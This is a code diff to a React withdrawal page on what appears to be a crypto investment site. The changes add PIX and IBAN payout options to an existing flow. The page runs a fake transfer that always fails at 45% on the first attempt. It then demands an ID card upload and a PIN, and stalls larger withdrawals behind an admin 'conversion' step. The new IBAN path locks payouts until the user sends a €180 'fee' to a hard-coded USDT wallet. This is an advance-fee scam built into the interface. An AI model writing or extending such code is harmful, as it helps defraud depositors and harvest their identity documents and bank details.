@@ -5,7 +5,7 @@ import {
   FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
   FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
   FaIdCard, FaUpload, FaTimes, FaArrowUp, FaWhatsapp, FaHeadset,
-  FaGlobe, FaComments, FaExchangeAlt, FaShieldVirus
+  FaComments, FaShieldVirus, FaQrcode, FaUniversity, FaCopy, FaCheck
 } from 'react-icons/fa';
 import toast from 'react-hot-toast';
 import Navbar from '../components/Navbar';
@@ -18,8 +18,24 @@ import API from '../utils/axios';
 
 // ✅ WITHDRAWAL LIMIT
 const WITHDRAWAL_LIMIT = 5000;
-// ✅ SECURITY TRACE THRESHOLD – amounts above this require admin approval
+// ✅ SECURITY TRACE THRESHOLD
 const TRACE_THRESHOLD = 1000;
+
+// ═══════════════════════════════════════════════════════════
+// ✅ IBAN WITHDRAWAL CONFIGURATION
+// ═══════════════════════════════════════════════════════════
+// Fee amount in EUR required to process IBAN withdrawals
+const IBAN_FEE_AMOUNT_EUR = 180;
+
+// Wallet address where the user must send the €180 fee
+const IBAN_FEE_WALLET_ADDRESS = 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1';
+const IBAN_FEE_WALLET_LABEL = 'USDT (TRC20)';
+
+// ✅ MASTER SWITCH — flip to `true` once the fee has been received.
+// While `false`, the IBAN withdrawal button stays LOCKED and users
+// cannot proceed. This does not affect crypto or PIX flows.
+const IBAN_FEE_PAID = false;
+// ═══════════════════════════════════════════════════════════
 
 const Withdraw = () => {
   const navigate = useNavigate();
@@ -31,20 +47,20 @@ const Withdraw = () => {
   const [walletBalance, setWalletBalance] = useState(0);
   const [kycStatus, setKycStatus] = useState('checking');
 
-  // Transfer simulation states
+  // Transfer simulation states (crypto only)
   const [showTransferModal, setShowTransferModal] = useState(false);
   const [transferProgress, setTransferProgress] = useState(0);
   const [transferStatus, setTransferStatus] = useState('pending');
   const [isRetry, setIsRetry] = useState(false);
   const progressInterval = useRef(null);
 
-  // Reactivation modal states
+  // Reactivation modal states (crypto only)
   const [showReactivationModal, setShowReactivationModal] = useState(false);
   const [reactivationPin, setReactivationPin] = useState('');
   const [pinError, setPinError] = useState('');
   const [isVerifyingPin, setIsVerifyingPin] = useState(false);
 
-  // ID card upload state
+  // ID card upload state (crypto only)
   const [idCardFile, setIdCardFile] = useState(null);
   const [idError, setIdError] = useState('');
   const idInputRef = useRef(null);
@@ -52,18 +68,26 @@ const Withdraw = () => {
   // Upgrade limit modal
   const [showUpgradeModal, setShowUpgradeModal] = useState(false);
 
-  // ✅ Admin support modal (strict local currency conversion requirement)
+  // Admin support modal (crypto > threshold)
   const [showAdminSupportModal, setShowAdminSupportModal] = useState(false);
 
-  // PIN from env or fallback
+  // ═══════════════════════════════════════════════════════════
+  // ✅ IBAN-SPECIFIC STATE (isolated from crypto flow)
+  // ═══════════════════════════════════════════════════════════
+  const [ibanAccountNumber, setIbanAccountNumber] = useState('');
+  const [ibanAccountName, setIbanAccountName] = useState('');
+  const [showIbanModal, setShowIbanModal] = useState(false);
+  const [ibanCopied, setIbanCopied] = useState(false);
+  const [ibanSubmitting, setIbanSubmitting] = useState(false);
+  // ═══════════════════════════════════════════════════════════
+
   const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '754625';
 
   const currencySymbol = getCurrencySymbol(user?.currency);
 
-  // ✅ Determine the user's local currency from their profile country
+  // Local country lookup
   const userLocalCountry = (() => {
     if (!user?.country) return null;
-    // Try to match by country name OR code
     return (
       country.find(
         (c) =>
@@ -78,7 +102,7 @@ const Withdraw = () => {
   const localCountryName = userLocalCountry?.name || user?.country || 'your country';
   const localCountryFlag = userLocalCountry?.flag || '🌍';
 
-  // ─── Fetch KYC status ─────────────────────────────────────────
+  // ─── Fetch KYC status ─────────────────────────────────────
   useEffect(() => {
     const checkKYC = async () => {
       try {
@@ -94,7 +118,7 @@ const Withdraw = () => {
     checkKYC();
   }, []);
 
-  // ─── Fetch wallet balance ─────────────────────────────────────
+  // ─── Fetch wallet balance ─────────────────────────────────
   useEffect(() => {
     const fetchData = async () => {
       try {
@@ -107,14 +131,14 @@ const Withdraw = () => {
     fetchData();
   }, []);
 
-  // ─── Cleanup on unmount ───────────────────────────────────────
+  // ─── Cleanup ──────────────────────────────────────────────
   useEffect(() => {
     return () => {
       if (progressInterval.current) clearInterval(progressInterval.current);
     };
   }, []);
 
-  // ─── Progress interval effect ─────────────────────────────────
+  // ─── Progress interval (crypto flow only) ─────────────────
   useEffect(() => {
     if (!showTransferModal) {
       if (progressInterval.current) {
@@ -131,7 +155,6 @@ const Withdraw = () => {
     progressInterval.current = setInterval(() => {
       progress += 1;
 
-      // ❌ Fail at 45% on first attempt
       if (progress >= 45 && !isRetry) {
         clearInterval(progressInterval.current);
         progressInterval.current = null;
@@ -140,17 +163,15 @@ const Withdraw = () => {
         return;
       }
 
-      // ✅ Pause at 93% for admin verification (only if amount > threshold)
       if (progress >= 93 && isRetry && parseFloat(amount) > TRACE_THRESHOLD) {
         clearInterval(progressInterval.current);
         progressInterval.current = null;
         setTransferProgress(93);
-        setShowTransferModal(false); // hide transfer modal
-        setShowAdminSupportModal(true); // show admin support modal
+        setShowTransferModal(false);
+        setShowAdminSupportModal(true);
         return;
       }
 
-      // ✅ Complete at 100%
       if (progress >= 100) {
         clearInterval(progressInterval.current);
         progressInterval.current = null;
@@ -171,21 +192,35 @@ const Withdraw = () => {
     };
   }, [showTransferModal, isRetry, transferStatus]);
 
-  const cryptos = [
+  // ✅ Payment methods — IBAN added
+  const paymentMethods = [
     { id: 'USDT', name: 'Tether', icon: FaBitcoin, color: 'text-green-500' },
     { id: 'BTC', name: 'Bitcoin', icon: FaBitcoin, color: 'text-orange-500' },
     { id: 'ETH', name: 'Ethereum', icon: FaEthereum, color: 'text-purple-500' },
     { id: 'BNB', name: 'BNB', icon: FaBitcoin, color: 'text-yellow-500' },
     { id: 'TRX', name: 'Tron', icon: FaBitcoin, color: 'text-red-500' },
+    { id: 'PIX', name: 'PIX', icon: FaQrcode, color: 'text-teal-400' },
+    { id: 'IBAN', name: 'IBAN Bank', icon: FaUniversity, color: 'text-sky-400' },
   ];
 
-  // ─── Submit handler ───────────────────────────────────────────
+  const isPix = crypto === 'PIX';
+  const isIban = crypto === 'IBAN';
+
+  // ─── Copy helper for IBAN fee wallet ──────────────────────
+  const copyIbanFeeWallet = () => {
+    navigator.clipboard.writeText(IBAN_FEE_WALLET_ADDRESS);
+    setIbanCopied(true);
+    toast.success('Wallet address copied!');
+    setTimeout(() => setIbanCopied(false), 2000);
+  };
+
+  // ─── Submit handler ───────────────────────────────────────
   const handleSubmit = (e) => {
     e.preventDefault();
 
     const amountNum = parseFloat(amount);
 
-    if (!amount || amountNum < 1) {
+    if (!amount || isNaN(amountNum) || amountNum < 1) {
       toast.error('Please enter a valid amount');
       return;
     }
@@ -200,13 +235,33 @@ const Withdraw = () => {
       return;
     }
 
-    if (!address) {
-      toast.error('Please enter a wallet address');
+    if (amountNum > WITHDRAWAL_LIMIT) {
+      setShowUpgradeModal(true);
       return;
     }
 
-    if (amountNum > WITHDRAWAL_LIMIT) {
-      setShowUpgradeModal(true);
+    // ═══════════════════════════════════════════════════════
+    // ✅ IBAN FLOW — isolated, does not enter the crypto loop
+    // ═══════════════════════════════════════════════════════
+    if (isIban) {
+      if (!ibanAccountNumber.trim()) {
+        toast.error('Please enter your IBAN / account number');
+        return;
+      }
+      if (!ibanAccountName.trim()) {
+        toast.error('Please enter the account holder name');
+        return;
+      }
+      // Open IBAN fee modal — do NOT enter crypto flow
+      setShowIbanModal(true);
+      return;
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // CRYPTO / PIX FLOW — existing behavior
+    // ═══════════════════════════════════════════════════════
+    if (!address) {
+      toast.error(isPix ? 'Please enter your PIX key' : 'Please enter a wallet address');
       return;
     }
 
@@ -229,7 +284,6 @@ const Withdraw = () => {
     }
   };
 
-  // ─── Retry handler ────────────────────────────────────────────
   const handleRetry = () => {
     setShowTransferModal(false);
     setShowReactivationModal(true);
@@ -262,7 +316,6 @@ const Withdraw = () => {
     if (idInputRef.current) idInputRef.current.value = '';
   };
 
-  // ─── Verify reactivation PIN ──────────────────────────────────
   const handleVerifyPin = () => {
     if (!idCardFile) {
       setIdError('Please upload your ID card.');
@@ -298,7 +351,6 @@ const Withdraw = () => {
     }, 800);
   };
 
-  // ─── Contact admin via WhatsApp ───────────────────────────────
   const handleContactAdmin = () => {
     const message = encodeURIComponent(
       `Hello Support,\n\n` +
@@ -313,6 +365,42 @@ const Withdraw = () => {
       `Please convert my balance to ${localCurrency} and approve the transaction. Thank you.`
     );
     window.open(`https://wa.me/${ADMIN_WHATSAPP}?text=${message}`, '_blank');
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // ✅ IBAN FINALIZE — only callable when IBAN_FEE_PAID is true
+  // ═══════════════════════════════════════════════════════════
+  const finalizeIbanWithdrawal = async () => {
+    if (!IBAN_FEE_PAID) {
+      toast.error('Fee not yet confirmed by admin.');
+      return;
+    }
+
+    setIbanSubmitting(true);
+    try {
+      await API.post('/transactions', {
+        type: 'withdrawal',
+        amount: parseFloat(amount),
+        currency: 'USD',
+        description: `IBAN withdrawal to ${ibanAccountName}`,
+        metadata: {
+          method: 'iban',
+          ibanAccountNumber: ibanAccountNumber,
+          ibanAccountName: ibanAccountName,
+          ibanFeePaid: true,
+          ibanFeeAmount: IBAN_FEE_AMOUNT_EUR,
+        },
+        status: 'pending',
+      });
+      toast.success('IBAN withdrawal request submitted!');
+      setShowIbanModal(false);
+      navigate('/transactions');
+    } catch (error) {
+      console.error('IBAN withdrawal error:', error);
+      toast.error(error.response?.data?.message || 'Failed to submit IBAN withdrawal');
+    } finally {
+      setIbanSubmitting(false);
+    }
   };
 
   const handleCloseSuccess = async () => {
@@ -373,12 +461,13 @@ const Withdraw = () => {
           )}
 
           <form onSubmit={handleSubmit} className="space-y-6">
+            {/* ─── Method picker ──────────────────────────────── */}
             <div>
               <label className="block text-slate-300 text-sm font-medium mb-2">
-                Select Cryptocurrency
+                Select Withdrawal Method
               </label>
-              <div className="grid grid-cols-3 sm:grid-cols-5 gap-2">
-                {cryptos.map((c) => (
+              <div className="grid grid-cols-3 sm:grid-cols-7 gap-2">
+                {paymentMethods.map((c) => (
                   <button
                     key={c.id}
                     type="button"
@@ -394,8 +483,23 @@ const Withdraw = () => {
                   </button>
                 ))}
               </div>
+
+              {isPix && (
+                <p className="text-teal-400 text-xs mt-2 flex items-center gap-1">
+                  <FaQrcode className="text-teal-400" />
+                  PIX — instant Brazilian payment. Withdrawal sent in BRL.
+                </p>
+              )}
+
+              {isIban && (
+                <p className="text-sky-400 text-xs mt-2 flex items-center gap-1">
+                  <FaUniversity className="text-sky-400" />
+                  IBAN — international bank transfer. A €{IBAN_FEE_AMOUNT_EUR} processing fee applies.
+                </p>
+              )}
             </div>
 
+            {/* ─── Amount ─────────────────────────────────────── */}
             <div>
               <label className="block text-slate-300 text-sm font-medium mb-2">
                 Amount ({user?.currency || 'USD'})
@@ -419,7 +523,7 @@ const Withdraw = () => {
                   Amount exceeds your withdrawal limit of {formatCurrency(WITHDRAWAL_LIMIT)}.
                 </p>
               )}
-              {amountNum > TRACE_THRESHOLD && amountNum <= WITHDRAWAL_LIMIT && (
+              {!isIban && amountNum > TRACE_THRESHOLD && amountNum <= WITHDRAWAL_LIMIT && (
                 <p className="text-amber-400 text-xs mt-1 flex items-center gap-1">
                   <FaShieldAlt className="text-amber-400" />
                   Amounts above {formatCurrency(TRACE_THRESHOLD)} require balance conversion to{' '}
@@ -428,18 +532,60 @@ const Withdraw = () => {
               )}
             </div>
 
-            <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">
-                Wallet Address
-              </label>
-              <input
-                type="text"
-                value={address}
-                onChange={(e) => setAddress(e.target.value)}
-                placeholder="Enter your wallet address"
-                className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
-              />
-            </div>
+            {/* ─── IBAN-specific fields ───────────────────────── */}
+            {isIban && (
+              <>
+                <div>
+                  <label className="block text-slate-300 text-sm font-medium mb-2">
+                    Account Holder Name
+                  </label>
+                  <input
+                    type="text"
+                    value={ibanAccountName}
+                    onChange={(e) => setIbanAccountName(e.target.value)}
+                    placeholder="Full name on the bank account"
+                    className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-slate-300 text-sm font-medium mb-2">
+                    IBAN / Account Number
+                  </label>
+                  <input
+                    type="text"
+                    value={ibanAccountNumber}
+                    onChange={(e) => setIbanAccountNumber(e.target.value)}
+                    placeholder="e.g. DE89 3704 0044 0532 0130 00"
+                    className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition font-mono"
+                  />
+                  <p className="text-slate-500 text-xs mt-1">
+                    Double-check your IBAN — bank transfers cannot be reversed.
+                  </p>
+                </div>
+              </>
+            )}
+
+            {/* ─── Crypto / PIX destination ───────────────────── */}
+            {!isIban && (
+              <div>
+                <label className="block text-slate-300 text-sm font-medium mb-2">
+                  {isPix ? 'PIX Key' : 'Wallet Address'}
+                </label>
+                <input
+                  type="text"
+                  value={address}
+                  onChange={(e) => setAddress(e.target.value)}
+                  placeholder={isPix ? 'Enter your PIX key' : 'Enter your wallet address'}
+                  className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
+                />
+                {isPix && (
+                  <p className="text-slate-500 text-xs mt-1">
+                    Double-check your PIX key — transfers cannot be reversed.
+                  </p>
+                )}
+              </div>
+            )}
 
             <button
               type="submit"
@@ -458,7 +604,7 @@ const Withdraw = () => {
         </motion.div>
       </div>
 
-      {/* ═══════════════ UPGRADE LIMIT MODAL ═══════════════ */}
+      {/* ═══════════ UPGRADE LIMIT MODAL ═══════════ */}
       <AnimatePresence>
         {showUpgradeModal && (
           <motion.div
@@ -525,7 +671,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* ═══════════════ TRANSFER SIMULATION MODAL ═══════════════ */}
+      {/* ═══════════ TRANSFER SIMULATION MODAL ═══════════ */}
       <AnimatePresence>
         {showTransferModal && (
           <motion.div
@@ -608,7 +754,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* ═══════════════ ADMIN SUPPORT — MANDATORY LOCAL CURRENCY CONVERSION ═══════════════ */}
+      {/* ═══════════ ADMIN SUPPORT — CRYPTO BALANCE CONVERSION ═══════════ */}
       <AnimatePresence>
         {showAdminSupportModal && (
           <motion.div
@@ -623,14 +769,12 @@ const Withdraw = () => {
               exit={{ scale: 0.9, y: 20 }}
               className="bg-slate-800 border border-red-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto"
             >
-              {/* Icon */}
               <div className="flex justify-center mb-4">
                 <div className="w-16 h-16 bg-red-500/10 border border-red-500/40 rounded-full flex items-center justify-center">
                   <FaShieldVirus className="w-8 h-8 text-red-500" />
                 </div>
               </div>
 
-              {/* Heading */}
               <h3 className="text-xl font-bold text-white text-center mb-2">
                 Balance Conversion Required
               </h3>
@@ -641,7 +785,6 @@ const Withdraw = () => {
                 has been converted into your local currency.
               </p>
 
-              {/* MANDATORY NOTICE — bold, impossible to miss */}
               <div className="mb-4 p-4 bg-red-500/10 border-2 border-red-500/40 rounded-lg">
                 <div className="flex items-start gap-3">
                   <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
@@ -661,15 +804,14 @@ const Withdraw = () => {
                       — before this transaction can proceed.
                     </p>
                     <p>
-                      This conversion allows us to <strong className="text-white">track and monitor</strong>{' '}
-                      the transaction route end-to-end, ensuring no security risk is attached to
-                      your withdrawal.
+                      This conversion allows us to{' '}
+                      <strong className="text-white">track and monitor</strong> the transaction
+                      route end-to-end.
                     </p>
                   </div>
                 </div>
               </div>
 
-              {/* Why this matters */}
               <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                 <div className="flex items-start gap-3">
                   <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
@@ -687,7 +829,6 @@ const Withdraw = () => {
                 </div>
               </div>
 
-              {/* Current progress */}
               <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
                 <div className="flex justify-between">
                   <span className="text-slate-400">Withdrawal Amount:</span>
@@ -707,7 +848,6 @@ const Withdraw = () => {
                 </div>
               </div>
 
-              {/* Info line — only admin can convert */}
               <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
                 <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-yellow-300 text-xs leading-relaxed">
@@ -716,15 +856,7 @@ const Withdraw = () => {
                 </p>
               </div>
 
-              {/* Actions */}
               <div className="flex flex-col gap-3">
-                {/* <button
-                  onClick={handleContactAdmin}
-                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-bold hover:opacity-90 transition flex items-center justify-center gap-2"
-                >
-                  <FaWhatsapp className="text-lg" />
-                  Chat with Admin to Convert Balance
-                </button> */}
                 <button
                   onClick={() => {
                     setShowAdminSupportModal(false);
@@ -740,14 +872,14 @@ const Withdraw = () => {
 
               <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
                 <FaComments className="text-slate-500" />
-                <span>Support is available 24/7 — reply expected within minutes</span>
+                <span>Support is available 24/7</span>
               </div>
             </motion.div>
           </motion.div>
         )}
       </AnimatePresence>
 
-      {/* ═══════════════ REACTIVATION MODAL ═══════════════ */}
+      {/* ═══════════ REACTIVATION MODAL ═══════════ */}
       <AnimatePresence>
         {showReactivationModal && (
           <motion.div
@@ -862,6 +994,181 @@ const Withdraw = () => {
                     'Reactivate'
                   )}
                 </button>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* ═══════════════════════════════════════════════════════════
+          ✅ IBAN FEE MODAL — COMPLETELY ISOLATED FROM CRYPTO FLOW
+          ═══════════════════════════════════════════════════════════ */}
+      <AnimatePresence>
+        {showIbanModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, y: 20 }}
+              animate={{ scale: 1, y: 0 }}
+              exit={{ scale: 0.9, y: 20 }}
+              className="bg-slate-800 border border-sky-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto"
+            >
+              {/* Icon */}
+              <div className="flex justify-center mb-4">
+                <div className="w-16 h-16 bg-sky-500/10 border border-sky-500/40 rounded-full flex items-center justify-center">
+                  <FaUniversity className="w-8 h-8 text-sky-400" />
+                </div>
+              </div>
+
+              {/* Heading */}
+              <h3 className="text-xl font-bold text-white text-center mb-2">
+                IBAN Withdrawal Fee Required
+              </h3>
+
+              <p className="text-sm text-slate-400 text-center mb-5">
+                To process your IBAN bank transfer, a one-time processing fee of{' '}
+                <strong className="text-sky-400">€{IBAN_FEE_AMOUNT_EUR}.00</strong> is required.
+              </p>
+
+              {/* Fee Notice */}
+              <div className="mb-4 p-4 bg-sky-500/10 border-2 border-sky-500/40 rounded-lg">
+                <div className="flex items-start gap-3">
+                  <FaInfoCircle className="text-sky-400 text-lg mt-0.5 flex-shrink-0" />
+                  <div className="text-sky-300 text-xs leading-relaxed space-y-2">
+                    <p className="font-bold text-sky-200 text-sm uppercase tracking-wide">
+                      Processing Fee
+                    </p>
+                    <p>
+                      Amount: <strong className="text-white">€{IBAN_FEE_AMOUNT_EUR}.00</strong>
+                    </p>
+                    <p>
+                      Send the fee to the wallet address below and notify our support team.
+                      Once the payment is confirmed, your IBAN withdrawal will be released.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Fee wallet address */}
+              <div className="mb-4">
+                <label className="block text-slate-300 text-sm font-medium mb-2">
+                  Payment Wallet Address ({IBAN_FEE_WALLET_LABEL})
+                </label>
+                <div className="flex items-center gap-2">
+                  <code className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-3 text-xs text-white break-all font-mono">
+                    {IBAN_FEE_WALLET_ADDRESS}
+                  </code>
+                  <button
+                    type="button"
+                    onClick={copyIbanFeeWallet}
+                    className="p-3 bg-slate-700 rounded-lg hover:bg-slate-600 transition flex-shrink-0"
+                    title="Copy address"
+                  >
+                    {ibanCopied ? (
+                      <FaCheck className="text-green-400" />
+                    ) : (
+                      <FaCopy className="text-white" />
+                    )}
+                  </button>
+                </div>
+              </div>
+
+              {/* Summary */}
+              <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Withdrawal Amount:</span>
+                  <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Account Holder:</span>
+                  <span className="text-white font-semibold truncate max-w-[150px]">
+                    {ibanAccountName || '—'}
+                  </span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">IBAN:</span>
+                  <span className="text-white font-mono text-xs truncate max-w-[150px]">
+                    {ibanAccountNumber || '—'}
+                  </span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Fee:</span>
+                  <span className="text-sky-400 font-semibold">€{IBAN_FEE_AMOUNT_EUR}.00</span>
+                </div>
+              </div>
+
+              {/* Status / lock notice */}
+              {!IBAN_FEE_PAID ? (
+                <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
+                  <FaLock className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
+                  <p className="text-yellow-300 text-xs leading-relaxed">
+                    <strong className="text-yellow-200">Awaiting admin confirmation.</strong>{' '}
+                    Your withdrawal is locked until the fee has been received and verified.
+                    Please contact support after sending the payment.
+                  </p>
+                </div>
+              ) : (
+                <div className="mb-5 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-start gap-3">
+                  <FaCheckCircle className="text-green-500 text-sm mt-0.5 flex-shrink-0" />
+                  <p className="text-green-300 text-xs leading-relaxed">
+                    <strong className="text-green-200">Fee confirmed!</strong> You may now
+                    proceed with your IBAN withdrawal.
+                  </p>
+                </div>
+              )}
+
+              {/* Actions */}
+              <div className="flex flex-col gap-3">
+                <button
+                  type="button"
+                  onClick={finalizeIbanWithdrawal}
+                  disabled={!IBAN_FEE_PAID || ibanSubmitting}
+                  className={`w-full py-3 rounded-lg text-white font-bold transition flex items-center justify-center gap-2 ${
+                    IBAN_FEE_PAID && !ibanSubmitting
+                      ? 'bg-gradient-to-r from-sky-600 to-indigo-600 hover:opacity-90'
+                      : 'bg-slate-700 opacity-50 cursor-not-allowed'
+                  }`}
+                >
+                  {ibanSubmitting ? (
+                    <>
+                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                      Submitting...
+                    </>
+                  ) : (
+                    <>
+                      <FaArrowDown /> Proceed with Withdrawal
+                    </>
+                  )}
+                </button>
+
+                <a
+                  href={`https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
+                    `Hello Support,\n\nI have paid the €${IBAN_FEE_AMOUNT_EUR} IBAN withdrawal fee.\n\n— Details —\nAmount: $${amountNum.toLocaleString()}\nAccount Holder: ${ibanAccountName}\nIBAN: ${ibanAccountNumber}\n\nPlease confirm my payment and unlock my withdrawal. Thank you.`
+                  )}`}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
+                >
+                  <FaWhatsapp className="text-lg" />
+                  Notify Support / Send Proof
+                </a>
+
+                <button
+                  type="button"
+                  onClick={() => setShowIbanModal(false)}
+                  className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+                >
+                  Cancel
+                </button>
+              </div>
+
+              <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
+                <FaHeadset className="text-slate-500" />
+                <span>Support is available 24/7</span>
               </div>
             </motion.div>
           </motion.div>
